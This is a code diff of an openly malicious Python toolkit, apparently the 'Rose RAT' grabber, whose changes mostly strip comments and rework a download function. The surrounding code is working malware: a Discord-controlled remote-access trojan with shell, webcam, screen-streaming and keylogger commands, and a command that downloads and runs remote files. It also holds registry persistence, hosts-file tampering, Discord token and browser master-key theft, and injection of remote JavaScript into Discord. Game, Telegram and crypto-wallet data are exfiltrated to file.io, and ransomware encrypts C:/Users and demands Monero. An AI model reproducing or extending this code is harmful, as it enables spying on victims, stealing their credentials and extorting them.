@@ -22,6 +22,7 @@ import keyboard
 import pywifi
 import pathlib
 import cv2
+import aiohttp
 import io
 import time
 import pyttsx3
@@ -581,7 +582,6 @@ class Chromium:
                     try:
                         operation(path, profile)
                     except Exception as e:
-                        # print(e)
                         pass
 
     def get_master_key(self, path: str) -> str:
@@ -800,8 +800,6 @@ class Startup():
         shutil.copy2(os.path.realpath(sys.executable), self.full_path)
 
     def regedit(self):
-        # subprocess.run(args=['reg', 'delete', self.reg_entry, '/v', self.regent_name, '/f'], shell=True)
-        # subprocess.run(args=['reg', 'add', self.reg_entry, '/v', self.regent_name, '/t', 'REG_SZ', '/d', self.full_path, '/f'], shell=True)
         subprocess.run(args=f'reg delete "{self.reg_entry}" /v {self.regent_name} /f', shell=True)
         subprocess.run(args=f'reg add "{self.reg_entry}" /v {self.regent_name} /t REG_SZ /d "{self.full_path}" /f', shell=True)
 
@@ -919,14 +917,14 @@ class CommandHandler():
             return output
 
         try:
-            result = str(_shell().stdout.decode('CP437'))  # CP437 Decoding used for characters like " é " etc..
+            result = str(_shell().stdout.decode('CP437'))
         except Exception as e:
             result = str(f"Error | Advanced log: {e}")
 
         embed = Embed(
             description='Rose RAT',
             color=11495919,
-            timestamp='now'  # sets the timestamp to current time
+            timestamp='now'
         )
 
         embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
@@ -939,7 +937,7 @@ class CommandHandler():
         embed = Embed(
             description='Rose RAT',
             color=11495919,
-            timestamp='now'  # sets the timestamp to current time
+            timestamp='now'
         )
 
         embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
@@ -948,11 +946,11 @@ class CommandHandler():
         self.webhook.send(embed=embed)
         os.system("shutdown /s /t 1")
 
-    def webcampic(self):  # Take a picture with the webcam and send it with the webhook
+    def webcampic(self):
         try:
-            cam = cv2.VideoCapture(0)  # 0 -> index of camera
+            cam = cv2.VideoCapture(0)
             s, img = cam.read()
-            if s:  # frame captured without any errors
+            if s:
                 suc, buffer = cv2.imencode(".jpg", img)
                 io_buf = io.BytesIO(buffer)
                 file = File(io_buf, name='cam.jpg')
@@ -962,7 +960,7 @@ class CommandHandler():
             embed = Embed(
                 description='Rose RAT',
                 color=16399677,
-                timestamp='now'  # sets the timestamp to current time
+                timestamp='now'
             )
 
             embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
@@ -992,7 +990,7 @@ class CommandHandler():
         embed = Embed(
             description='Rose RAT',
             color=11495919,
-            timestamp='now'  # sets the timestamp to current time
+            timestamp='now'
         )
 
         embed.set_author(name=f"Connection Uptime", icon_url=cc.get_avatar())
@@ -1018,35 +1016,25 @@ class CommandHandler():
             def connect():
                 while True:
                     with mss() as sct:
-                        # The region to capture
                         rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
 
                         while True:
-                            # Capture the screen
                             img = sct.grab(rect)
-                            # Tweak the compression level here (0-9)
                             pixels = compress(img.rgb, 6)
 
-                            # Send the size of the pixels length
                             size = len(pixels)
                             size_len = (size.bit_length() + 7) // 8
                             final_size_len = bytes([size_len])
-                            # conn.send(bytes([size_len]))
 
-                            # Send the actual pixels length
                             size_bytes = size.to_bytes(size_len, 'big')
                             final_size_bytes = size_bytes
-                            # conn.send(size_bytes)
-
-                            # Send pixels
-                            # conn.sendall(pixels)
 
                             _sio.emit('sending_screenshot', {'data': {
                                 'size_len': final_size_len,
                                 'size_bytes': final_size_bytes,
                                 'pixels': pixels
                             }})
-                            time.sleep(0.5)  # Don't overload the server
+                            time.sleep(0.5)
 
             _sio.connect(cc.get_rose_discord_rat_link())
 
@@ -1142,7 +1130,6 @@ def format_drive_info(drives):
         formatted_info.append(formatted)
     return " - ".join(formatted_info)
 
-#pygame.camera.init()
 username = str(os.getenv("USERNAME"))
 hostname = str(os.environ['COMPUTERNAME'])
 hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8", errors="ignore")
@@ -1171,7 +1158,6 @@ product_key = str(output.split('\n', 1)[-1].strip()) if output else "No Product 
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
 power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
 screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
-#webcams_count = len(pygame.camera.list_cameras())
 internal_ip = str(socket.gethostbyname(socket.gethostname()))
 external_ip = str(requests.get('https://api.ipify.org').text)
 gpus = GPUtil.getGPUs()
@@ -1270,12 +1256,6 @@ def send_device_information():
                     f"`{screen}`",
                 "inline": False,
             },
-            #{
-            #    "name": "Webcams",
-            #    "value":
-            #        f"`{webcams_count}`",
-            #    "inline": False,
-            #},
             {
                 "name": "Internal IP",
                 "value":
@@ -1374,11 +1354,11 @@ def block_sites():
     newdata = "\n".join(newdata).replace("\n\n", "\n")
 
     subprocess.run("attrib -r {}".format(hostfilepath), shell=True,
-                   capture_output=True)  # Removes read-only attribute from hosts file
+                   capture_output=True)
     with open(hostfilepath, "w") as file:
         file.write(newdata)
     subprocess.run("attrib +r {}".format(hostfilepath), shell=True,
-                   capture_output=True)  # Adds read-only attribute to hosts file
+                   capture_output=True)
 
 def user_check():
     USERS = [
@@ -1880,8 +1860,6 @@ class InjectionX:
             self.appdata + '\\DiscordDevelopment'
         ]
         self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/obf-injection.js').text
-        #if cc.get_nitro_auto_buy() is True:
-        #    self.code = self.code.replace("auto_buy_nitro: false,", "auto_buy_nitro: true,")
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
@@ -1925,11 +1903,11 @@ class InjectionX:
                             subprocess.call([update, '--processStart', executable],
                                             shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-target_directory = r'C:/Users' # Directory to encrypt
-webhook_url = cc.get_ransomware_discord_webhook_url() # Discord Webhook URL
-email_adr = cc.get_ransomware_email_adress() # Email Adress where your encryption key will be sent
-monero_adr = cc.get_ransomware_monero_wallet_adress() # Monero Wallet Address
-cash = cc.get_ransomware_amount_of_money() # Amount of money to receive
+target_directory = r'C:/Users'
+webhook_url = cc.get_ransomware_discord_webhook_url()
+email_adr = cc.get_ransomware_email_adress()
+monero_adr = cc.get_ransomware_monero_wallet_adress()
+cash = cc.get_ransomware_amount_of_money()
 
 timestamp = datetime.now().isoformat()
 
@@ -1968,12 +1946,12 @@ def log_error(e):
         pass
 
 characters = string.ascii_letters + string.digits
-user_id = ''.join(random.choice(characters) for i in range(9)) # Creates random user ID
+user_id = ''.join(random.choice(characters) for i in range(9))
 
-key = Fernet.generate_key() # Creates random AES key
+key = Fernet.generate_key()
 cipher_suite = Fernet(key)
 
-encryptedfiles = [] # Saves all encrypted files
+encryptedfiles = []
 
 ransom_note = f"""Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.
 
@@ -2011,7 +1989,7 @@ def send_wh():
             {
                 "title": "Rose Ransomware Hit",
                 "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks. https://github.com/DamagingRose/Rose-Grabber/tree/main/resources/utils/rosedec",
-                "url": "https://github.com/voyqge",
+                "url": "https://github.com/gumbobr0t",
                 "color": cc.get_color(),
                 "fields": [
                     {
@@ -2031,7 +2009,7 @@ def send_wh():
                     }
                 ],
                 "footer": {
-                    "text": "https://github.com/voyqge"
+                    "text": "https://github.com/gumbobr0t"
                 },
                 "timestamp": timestamp
             }
@@ -2065,10 +2043,10 @@ def encrypt_directory(directory_path):
             except OSError as e:
                 if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                                errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
-                    pass  # Ignore permission/access errors
+                    pass
             except Exception as e:
                 if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
-                    pass  # Ignore common file errors
+                    pass
                 else:
                     log_error(e)
 
@@ -2116,16 +2094,12 @@ def Trigger():
         byref(c_uint())
     )
 
-### CONFIG
+btoken = cc.get_knight_discord_rat_bot_token()
+prefix = cc.get_knight_discord_rat_prefix()
+userid = cc.get_knight_discord_rat_listener_user_id()
+channelid = cc.get_knight_discord_rat_channel_id()
 
-btoken = cc.get_knight_discord_rat_bot_token() ### NOT OPTIONAL | DISCORD BOT TOKEN NEEDS TO BE PUT HERE FOR THE RAT TO WORK
-prefix = cc.get_knight_discord_rat_prefix() ### OPTIONAL | IGNORE THIS IF YOU WANT TO RUN COMMANDS WITHOUT A PREFIX | PREFIX THE DISCORD BOT WILL BE CALLED WITH
-userid = cc.get_knight_discord_rat_listener_user_id() ### OPTIONAL | IGNORE THIS IF YOU DON'T WANT TO BE PINGED | ONLY WORKS WITH CHANNELID SET | THIS IS THE USER WHO WILL BE NOTIFIED ABOUT NEW CLIENTS WITH A PING
-channelid = cc.get_knight_discord_rat_channel_id() ### OPTIONAL | ONLY SET IF YOU WANT TO GET A MESSAGE WHEN NEW CLIENTS GET ONLINE
-
-### DEV CONFIG
-
-dscrd = 'https://discord.gg/rHdqqqYVzY'
+dscrd = 'https://discord.gg/sMawrDqnta'
 roaming = os.getenv("appdata")
 startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
@@ -2191,7 +2165,7 @@ async def taskschd(ctx, inputid):
 async def keylogger(ctx, inputid, duration):
     if inputid == clientid:
         kstring_random(15)
-        record_time = duration ### DURATION OF KEYLOGGER IN SECONDS
+        record_time = duration
         fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
         end_time = time.monotonic() + int(record_time)
         recorded = []
@@ -2222,7 +2196,7 @@ async def keylogger(ctx, inputid, duration):
     if inputid != clientid:
         if inputid == 'all':
             kstring_random(15)
-            record_time = duration ### DURATION OF KEYLOGGER IN SECONDS
+            record_time = duration
             fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
             end_time = time.monotonic() + int(record_time)
             recorded = []
@@ -2256,20 +2230,20 @@ async def keylogger(ctx, inputid, duration):
 @bot.command(name='msgbox')
 async def msgbox(ctx, inputid, title, msg):
     if inputid == clientid:
-        MB_OK = 0x0 ### BUTTON
-        ICON_EXCLAIM = 0x30 ### ICON
+        MB_OK = 0x0
+        ICON_EXCLAIM = 0x30
         try:
-            ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITHOUT PROMOTION
-            await ctx.send(f'Successfully showed message box without promotion for process {clientid}.')
+            ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
+            await ctx.send(f'Successfully showed message box for process {clientid}.')
         except Exception:
             await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
     if inputid != clientid:
         if inputid == 'all':
-            MB_OK = 0x0 ### BUTTON
-            ICON_EXCLAIM = 0x30 ### ICON
+            MB_OK = 0x0
+            ICON_EXCLAIM = 0x30
             try:
-                ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM) ### FINAL MSGBOX WITHOUT PROMOTION
-                await ctx.send(f'Successfully showed message box without promotion for process {clientid}.')
+                ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
+                await ctx.send(f'Successfully showed message box for process {clientid}.')
             except Exception:
                 await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
         if inputid != 'all' and clientid:
@@ -2324,60 +2298,68 @@ async def startup(ctx, inputid):
             await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
             
 @bot.command(name='upload')
-async def upload(ctx, inputid, dwnldlink, filetype): ### PUT FILE TYPES LIKE .png, .exe, .msi, .txt AND MORE THERE WHEN USING THE COMMAND
+async def upload(ctx, inputid, dwnldlink, filetype):
     if inputid == clientid:
         kstring_random(5)
-        r = requests.get(dwnldlink, allow_redirects=True)
-        fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
-        open(fname, 'wb').write(r.content)
-        emojis = ['✅', '❌']
-        msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
-        for emoji in emojis:
-            await msg.add_reaction(emoji)
-        @bot.event
-        async def on_reaction_add(reaction, user):
-            emoji = reaction.emoji
-            if user.bot:
-                return
-            if emoji == '✅':
-                try:
-                    os.system(fname)
-                    await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
-                except Exception:
-                    await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
-                return
-            elif emoji == '❌':
-                await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
-                return
-            else:
-                return
+        async with aiohttp.ClientSession() as session:
+            async with session.get(dwnldlink) as response:
+                if response.status == 200:
+                    content = await response.read()
+                    fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
+                    with open(fname, 'wb') as file:
+                        file.write(content)
+                    emojis = ['✅', '❌']
+                    msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
+                    for emoji in emojis:
+                        await msg.add_reaction(emoji)
+                    @bot.event
+                    async def on_reaction_add(reaction, user):
+                        emoji = reaction.emoji
+                        if user.bot:
+                            return
+                        if emoji == '✅':
+                            try:
+                                os.system(fname)
+                                await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
+                            except Exception:
+                                await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
+                            return
+                        elif emoji == '❌':
+                            await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
+                            return
+                        else:
+                            return
     if inputid != clientid:
         if inputid == 'all':
             kstring_random(5)
-            r = requests.get(dwnldlink, allow_redirects=False)
-            fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
-            open(fname, 'wb').write(r.content)
-            emojis = ['✅', '❌']
-            msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
-            for emoji in emojis:
-                await msg.add_reaction(emoji)
-            @bot.event
-            async def on_reaction_add(reaction, user):
-                emoji = reaction.emoji
-                if user.bot:
-                    return
-                if emoji == '✅':
-                    try:
-                        os.system(fname)
-                        await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
-                    except Exception:
-                        await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
-                    return
-                elif emoji == '❌':
-                    await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
-                    return
-                else:
-                    return
+            async with aiohttp.ClientSession() as session:
+                async with session.get(dwnldlink) as response:
+                    if response.status == 200:
+                        content = await response.read()
+                        fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
+                        with open(fname, 'wb') as file:
+                            file.write(content)
+                        emojis = ['✅', '❌']
+                        msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
+                        for emoji in emojis:
+                            await msg.add_reaction(emoji)
+                        @bot.event
+                        async def on_reaction_add(reaction, user):
+                            emoji = reaction.emoji
+                            if user.bot:
+                                return
+                            if emoji == '✅':
+                                try:
+                                    os.system(fname)
+                                    await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
+                                except Exception:
+                                    await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
+                                    return
+                            elif emoji == '❌':
+                                await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
+                                return
+                            else:
+                                return
         if inputid != 'all' and clientid:
             await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
                            
@@ -2385,7 +2367,7 @@ async def upload(ctx, inputid, dwnldlink, filetype): ### PUT FILE TYPES LIKE .pn
 async def wallpaper(ctx, inputid, rawimg):
     if inputid == clientid:
         r = requests.get(rawimg, allow_redirects=False)
-        fname = f'newwallpaper_{clientid}.jpg' ### ONLY .jpg IMAGES
+        fname = f'newwallpaper_{clientid}.jpg'
         open(fname, 'wb').write(r.content)
         path = os.path.abspath(fname)
         ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
@@ -2394,7 +2376,7 @@ async def wallpaper(ctx, inputid, rawimg):
     if inputid != clientid:
         if inputid == 'all':
             r = requests.get(rawimg, allow_redirects=False)
-            fname = f'newwallpaper_{clientid}.jpg' ### ONLY .jpg IMAGES
+            fname = f'newwallpaper_{clientid}.jpg'
             open(fname, 'wb').write(r.content)
             path = os.path.abspath(fname)
             ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
@@ -2994,8 +2976,6 @@ class get_games():
         self.games_zip = os.path.join(self.rose_path, 'Games.zip')
 
     def get_games(self):
-        # Telegram
-        
         if not os.path.exists(self.tdata_path):
             self.telegram_check = True
         else:
@@ -3010,8 +2990,6 @@ class get_games():
             except Exception:
                 self.telegram_check = True
                 pass
-
-        # Epic Games
 
         if not os.path.exists(self.epic_games_path):
             self.epic_games_check = True
@@ -3028,8 +3006,6 @@ class get_games():
                 self.epic_games_check = True
                 pass
 
-        # Steam
-
         if not os.path.exists(self.steam_path):
             self.steam_check = True
         else:
@@ -3045,8 +3021,6 @@ class get_games():
                 self.steam_check = True
                 pass
 
-        # Uplay
-
         if not os.path.exists(self.uplay_launcher_path):
             self.uplay_check = True
         else:
@@ -3061,9 +3035,7 @@ class get_games():
             except Exception:
                 self.uplay_check = True
                 pass
-
-        # Exodus
-
+       
         if not os.path.exists(self.exodus_path):
             self.exodus_check = True
         else:
@@ -3078,8 +3050,6 @@ class get_games():
             except Exception:
                 self.exodus_check = True
                 pass
-
-        # Minecraft
 
         if os.path.exists(self.minecraft_folder):
             shutil.rmtree(self.minecraft_folder)
@@ -3098,8 +3068,6 @@ class get_games():
                     shutil.copy(self.minecraftPath, os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                 except Exception as e:
                     pass
-
-        # Create ZIP
 
         if (not self.epic_games_check or not self.steam_check or not self.uplay_check or not self.telegram_check or not self.minecraft_check or not self.exodus_check):
             if not os.path.exists(self.games_zip):
@@ -3152,8 +3120,6 @@ class get_games():
                                 arcname = os.path.join("Minecraft", arcname)
                                 zf.write(file_path, arcname)
 
-            # Upload ZIP
-
             upload_url = "https://file.io"
             files = {"file": (self.games_zip, open(self.games_zip, "rb"))}
             response = requests.post(upload_url, files=files)
@@ -3164,8 +3130,6 @@ class get_games():
                 self.download_link = "Unknown"
         
             self.embed.add_field(name='Games', value=f'[Download]({self.download_link})', inline=False)
-
-            # Send embed with download link
 
             self.webx.send(embed=self.embed)
 
@@ -3268,8 +3232,6 @@ def CryptUnprotectData2(encrypted_bytes, entropy=b""):
                                          byref(blob_out)):
         return GetData(blob_out)
 
-# credits to lotus
-
 Tokens = ""
 dclass = DiscordX()
 
@@ -3284,10 +3246,8 @@ def GetDiscord(path, arg):
         local_state = loads(f.read())
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = CryptUnprotectData2(master_key[5:])
-    # print(path, master_key)
 
     for file in os.listdir(pathC):
-        # print(path, file)
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [
                     x.strip() for x in open(f"{pathC}\\{file}",
@@ -3301,9 +3261,7 @@ def GetDiscord(path, arg):
                         b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                     if dclass.checkToken(
                             tokenDecoded) and tokenDecoded not in Tokens:
-                        # print(token)
                         Tokens += tokenDecoded
-                        # writeforfile(Tokens, 'tokens')
                         dclass.uploadToken(tokenDecoded)
 
 def GetTokens(path, arg):
